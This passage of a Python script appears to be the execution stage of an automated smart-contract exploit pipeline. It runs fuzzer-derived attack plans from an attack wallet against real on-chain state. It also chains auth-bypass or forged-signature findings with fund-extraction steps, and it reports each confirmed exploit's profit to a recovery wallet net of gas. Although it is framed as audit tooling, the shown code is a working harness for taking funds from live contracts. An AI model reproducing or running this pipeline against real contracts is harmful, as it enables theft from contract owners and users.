                return skip_status_for(reason), 0, 0, 0, 0
            return execute_plan(
                w3_, acct_, nonce_box_, attack_wallet_, plan_, recovery_wallet_, tee_, chain=chain,
                return_units=True,
            )

        def _unpack5(result: tuple) -> tuple:
            """Normalises an execute_plan/gated result into the 5-tuple
            (status, delta, gas_spent_wei, net_wei, gas_units). A 4-tuple
            (an older/skip path) or 2-tuple still works -- the missing
            fields default to 0 -- so the structured proof never breaks
            the run over a shape difference."""
            r = tuple(result)
            r = r + (0,) * (5 - len(r))
            return r[0], r[1], r[2], r[3], r[4]

        results = []
        for finding in findings:
            plan = finding["plan"]
            # PHASE 1.2: stamp the plan's own gas reality (estimate vs the
            # chain's real block limit) from the fork, BEFORE execution --
            # this is the honest, non-metered answer to "does this fit in a
            # block". Written back into the plan.json so the report carries
            # it, and included in the structured proof's gas_used fallback.
            gas_fit_info = None
            if fork_w3 is not None:
                gas_fit_info = estimate_plan_gas_on_fork(
                    fork_w3, acct, attack_wallet, plan, args.chain
                )
                if gas_fit_info is not None:
                    plan["gas_estimate"] = gas_fit_info["gas_estimate"]
                    plan["fits_block_gas_limit"] = gas_fit_info["fits_block_gas_limit"]
                    plan["gas_headroom_pct"] = gas_fit_info["gas_headroom_pct"]
                    plan["block_gas_limit"] = gas_fit_info["block_gas_limit"]
                    if not gas_fit_info["fits_block_gas_limit"]:
                        tee.log(
                            f"GAS: plan '{plan.get('contract_name', '?')}' needs {gas_fit_info['gas_estimate']} gas "
                            f"(largest single step) but the block limit is {gas_fit_info['block_gas_limit']} "
                            f"(headroom {gas_fit_info['gas_headroom_pct']}%) -- flagged fits_block_gas_limit=false.",
                            alert=True,
                        )
                    try:
                        finding["plan_path"].write_text(json.dumps(plan, indent=2))
                    except OSError:
                        pass
            # Each finding is tried in complete isolation: one plan raising
            # (a raw RPC rejection, a nonce already taken by a tx that
            # never landed, ...) must not abort the plans after it. That
            # exact failure killed a real run that still had 1945 plans
            # left to try. Report the plan as INCONCLUSIVE and continue.
            try:
                status, recovery_delta_wei, gas_spent_wei, net_wei, gas_units = _unpack5(
                    gated_execute_plan(
                        w3, acct, nonce_box, attack_wallet, plan, args.recovery_wallet, tee, chain=args.chain
                    )
                )
            except Exception as e:
                tee.log(f"INCONCLUSIVE: plan for {plan.get('contract_name', '?')} raised {type(e).__name__}: {e} -- continuing with the remaining plans.", alert=True)
                status, recovery_delta_wei, gas_spent_wei, net_wei, gas_units = PLAN_INCONCLUSIVE, 0, 0, 0, 0
            # If the plan was never sent (skipped / not attempted), fall
            # back to the fork estimate for the proof's `gas_used`, so the
            # proof still carries the real footprint of what WOULD have run.
            if not gas_units and gas_fit_info is not None:
                gas_units = gas_fit_info.get("gas_estimate", 0)
            # PHASE 1.1: the plan carries the ACTUAL gas (units) its own
            # execution consumed -- measured when it ran for real, or the
            # fork estimate when it was skipped/never sent (see above). This
            # is written back so plan.json carries BOTH `gas_estimate` and
            # `gas_used`, not the estimate alone.
            plan["gas_used"] = gas_units
            plan_path = finding.get("plan_path")
            if plan_path is not None:
                try:
                    plan_path.write_text(json.dumps(plan, indent=2))
                except OSError:
                    pass
            results.append({
                "contract_name": plan["contract_name"],
                "kind": plan["kind"],
                "status": status,
                "recovery_delta_wei": recovery_delta_wei,
                "gas_spent_wei": gas_spent_wei,
                "net_profit_wei": net_wei,
                "gas_estimate": plan.get("gas_estimate"),
                "fits_block_gas_limit": plan.get("fits_block_gas_limit"),
                "gas_headroom_pct": plan.get("gas_headroom_pct"),
                "proof": build_proof(
                    finding, status, recovery_delta_wei, gas_spent_wei, net_wei, gas_units
                ).to_dict(),
            })

        # Strategy Layer, phase 2: the independent pass above tries every
        # finding alone, in isolation -- it can't discover a compound
        # exploit that needs an unlock-class finding (forged signature,
        # auth bypass, ...) replayed immediately before an objective-class
        # finding (fund extraction) that alone reverts against real,
        # unmodified chain state. See strategy_layer.py's module doc and
        # skills/forksploit-contract-audit/SKILL.md for the full writeup.
        # Deliberately only runs AFTER the independent pass, using its
        # results to skip chaining anything that already confirmed alone.
        already_confirmed = {r["contract_name"] for r in results if r["status"] == PLAN_CONFIRMED}
        chain_results = strategy_layer.run_chain_attempts(
            gated_execute_plan, w3, acct, nonce_box, attack_wallet, findings, already_confirmed,
            args.recovery_wallet, tee, chain=args.chain,
        )
        for cr in chain_results:
            # A composed plan's own metadata lives on the merged plan dict
            # (compose_plan carries the fuzzer's flags forward); reuse the
            # same structured proof so a chained finding is explained
            # exactly like an independent one.
            chained_finding = {
                "plan": {},
                "owner_impersonation": cr.get("owner_impersonation", False),
                "atomic_replayable": cr.get("atomic_replayable", True),
                "distinct_callers": cr.get("distinct_callers", 1),
            }
            results.append({
                "contract_name": cr["merged_contract_name"],
                "kind": f"flat, chained: {cr['unlock_contract_name']} -> {cr['objective_contract_name']}",
                "status": cr["status"],
                "recovery_delta_wei": cr["recovery_delta_wei"],
                "gas_spent_wei": cr.get("gas_spent_wei", 0),
                "net_profit_wei": cr.get("net_profit_wei", 0),
                "gas_estimate": cr.get("gas_estimate"),
                "fits_block_gas_limit": cr.get("fits_block_gas_limit"),
                "gas_headroom_pct": cr.get("gas_headroom_pct"),
                "proof": build_proof(
                    chained_finding, cr["status"], cr["recovery_delta_wei"],
                    cr.get("gas_spent_wei", 0), cr.get("net_profit_wei", 0), cr.get("gas_units", 0),
                ).to_dict(),
            })

        final_recovery_balance = w3.eth.get_balance(Web3.to_checksum_address(args.recovery_wallet))
        tee.log("=== Per-bug confirmation ===")
        for r in results:
            label = {
                PLAN_CONFIRMED: "CONFIRMED (real, reproduced on real chain state)",
                PLAN_NOT_CONFIRMED: "NOT CONFIRMED (reverted against real state -- likely false positive or needs different preconditions)",
                PLAN_INCONCLUSIVE: "INCONCLUSIVE (not actually attempted -- no signal either way, see log above for why)",
                PLAN_EXECUTED_NO_PROFIT: "EXECUTED, NO PROFIT (every step succeeded but the recovery wallet's real balance did not increase -- NOT a confirmed exploit for reporting)",
                PLAN_SKIPPED_UNPROFITABLE: "SKIPPED, UNPROFITABLE (free pre-flight already proved it reverts or cannot out-earn its own gas -- NO real transaction was sent, so no gas was spent on it)",
                PLAN_SKIPPED_NOT_EXTRACTABLE: "SKIPPED, NOT EXTRACTABLE (found, but there is no runnable extraction step -- a Review-tier heuristic, an un-replayable trace, or a multi-caller trace; NO real transaction was sent)",
                PLAN_OVERSIZED_GAS: "OVERSIZED GAS (measured gas footprint exceeds the block gas limit -- physically un-includable in one block; NO real transaction was sent)",
            }[r["status"]]
            # recovery_delta_wei is the deterministic proof itself for a
            # CONFIRMED plan: this plan's own measured, on-chain balance
            # increase on the recovery wallet, not an inferred/derived number.
            # The net figure subtracts this plan's own real gas bill, so a
            # "gained" number is never quoted without what it cost to get.
            delta_note = ""
            if r["status"] == PLAN_CONFIRMED:
                delta_note = f" -- recovery wallet gained {w3.from_wei(r['recovery_delta_wei'], 'ether')} {native_symbol_for_w3(w3)}"
                gas_spent = r.get("gas_spent_wei", 0)
                if gas_spent:
                    net = r.get("net_profit_wei", r["recovery_delta_wei"] - gas_spent)
                    delta_note += (
                        f" (net {format_wei_signed(w3, net)} {native_symbol_for_w3(w3)} after "
                        f"{w3.from_wei(gas_spent, 'ether')} {native_symbol_for_w3(w3)} gas"
                        + (", NET LOSS)" if net < 0 else ")")
                    )
            # The highest confidence tier: only a CONFIRMED plan whose own
            # measured recovery delta is strictly positive. A clean-but-zero
            # execution (PLAN_EXECUTED_NO_PROFIT) is a different status and
            # can never appear here.
            tier = " [chain-verified]" if is_chain_verified(r["status"], r["recovery_delta_wei"]) else ""
            # Task spec §6.8 ("No hiding of errors"): when the plan did NOT
            # clear every gate, name the blockers inline instead of leaving
            # the reader to infer them from the status word alone.
            proof = r.get("proof") or {}
            blockers = proof.get("blockers") or []
            blockers_note = ""
            if blockers:
                shown = blockers[:2]
                blockers_note = " [blocked: " + "; ".join(shown) + ("; ..." if len(blockers) > len(shown) else "") + "]"
            tee.log(f"  {r['contract_name']} ({r['kind']}){tier}: {label}{delta_note}{blockers_note}")
        confirmed = sum(1 for r in results if r["status"] == PLAN_CONFIRMED)
        not_confirmed = sum(1 for r in results if r["status"] == PLAN_NOT_CONFIRMED)
        inconclusive = sum(1 for r in results if r["status"] == PLAN_INCONCLUSIVE)
        executed_no_profit = sum(1 for r in results if r["status"] == PLAN_EXECUTED_NO_PROFIT)
        skipped_unprofitable = sum(1 for r in results if r["status"] == PLAN_SKIPPED_UNPROFITABLE)
        skipped_not_extractable = sum(1 for r in results if r["status"] == PLAN_SKIPPED_NOT_EXTRACTABLE)
        oversized_gas = sum(1 for r in results if r["status"] == PLAN_OVERSIZED_GAS)
        owner_impersonation_count = sum(
            1 for f in findings if f["plan"].get("owner_impersonation", False)
        )
        total_confirmed_delta_wei = sum(r["recovery_delta_wei"] for r in results if r["status"] == PLAN_CONFIRMED)
        total_confirmed_gas_wei = sum(r.get("gas_spent_wei", 0) for r in results if r["status"] == PLAN_CONFIRMED)
        total_confirmed_net_wei = total_confirmed_delta_wei - total_confirmed_gas_wei
        tee.log(
            f"=== Run complete: {confirmed} confirmed, {not_confirmed} not confirmed, {inconclusive} inconclusive, "
            f"{executed_no_profit} executed-no-profit, {skipped_unprofitable} skipped-unprofitable, "
            f"{skipped_not_extractable} skipped-not-extractable, {oversized_gas} oversized-gas "
            f"(of {len(plan_files)} plan(s) found, {len(chain_results)} chain "
            f"attempt(s) tried). Sum of CONFIRMED recovery-wallet gains this run: "
            f"{w3.from_wei(total_confirmed_delta_wei, 'ether')} {native_symbol_for_w3(w3)} gross, "
            f"{format_wei_signed(w3, total_confirmed_net_wei)} {native_symbol_for_w3(w3)} net "
            f"(after {w3.from_wei(total_confirmed_gas_wei, 'ether')} {native_symbol_for_w3(w3)} of gas actually paid). "
            f"Recovery wallet "
            f"{args.recovery_wallet} final balance: {w3.from_wei(final_recovery_balance, 'ether')} {native_symbol_for_w3(w3)} ==="
        )
        if skipped_unprofitable:
            tee.log(
                f"Pre-flight gate saved this run from sending {skipped_unprofitable} plan(s) that would only have "
                "burned gas (no real transaction was ever signed for them -- see the SKIP lines above for each one's reason)."
            )
        if skipped_not_extractable:
            tee.log(
                f"{skipped_not_extractable} plan(s) were skipped as NOT EXTRACTABLE: the fuzzer found something "
                "real there, but the plan carries no runnable extraction step (a Review-tier heuristic finding, an "
                "un-replayable trace, or a multi-caller trace) -- so there was nothing for AttackWallet to replay. "
                "Those findings are still reported as evidence (see the bug-type summary above); they are simply not "
                "exploits this pipeline can execute automatically."
            )
        if oversized_gas:
            tee.log(
                f"{oversized_gas} plan(s) were flagged OVERSIZED GAS: their own measured gas footprint (the node's "
                "eth_estimateGas against the real block.gasLimit) exceeds one block, so they are physically "
                "un-includable and no real transaction was sent for them. This is the PHASE 1 guard for the un-metered "
                "revm model: a trace valid in an idealised, unlimited-gas simulation can never fit in a block on-chain."
            )
        if owner_impersonation_count:
            # Surface WHERE the impersonated identity came from, not just
            # that the plan is a false positive: each plan now carries
            # `owner_impersonation_detail` = [{caller, harvested_from_contract,
            # harvested_from_slot}]. A reader can then see, e.g., "slot 0 of
            # 0x9f53..." rather than having to re-run the campaign.
            origins: set = set()
            for f in findings:
                for d in f["plan"].get("owner_impersonation_detail", []) or []:
                    origins.add((d.get("harvested_from_contract"), d.get("harvested_from_slot")))
            origin_note = ""
            if origins:
                sample = sorted(origins)[:3]
                origin_note = " Harvested from " + "; ".join(
                    f"contract {c} slot {s}" for c, s in sample
                ) + (" (and more)" if len(origins) > len(sample) else "") + "."
            tee.log(
                f"{owner_impersonation_count} of those plan(s) are OWNER-IMPERSONATION false positives: the trace's "
                "caller is an address the fuzzer read out of the TARGET's own storage (its owner/admin/multisig), so "
                "the 'attack' is really the privileged party calling its own owner-gated functions (e.g. "
                f"escapeHatch()).{origin_note} No external signer can reproduce this, and there is no bug to fix -- "
                "these are labelled in each plan.json via \"owner_impersonation\": true (with the exact "
                "contract/slot in \"owner_impersonation_detail\") so they can be filtered out."
            )

        tee.log(f"Full log: {LOGS_DIR / f'auto_pipeline_{run_id}.log'}")
        return 0
    finally:
        if "fork_proc" in locals() and fork_proc is not None:
            fork_proc.terminate()
            try:
                fork_proc.wait(timeout=5)
            except Exception:
                fork_proc.kill()
        tee.close()


if __name__ == "__main__":
    sys.exit(main())
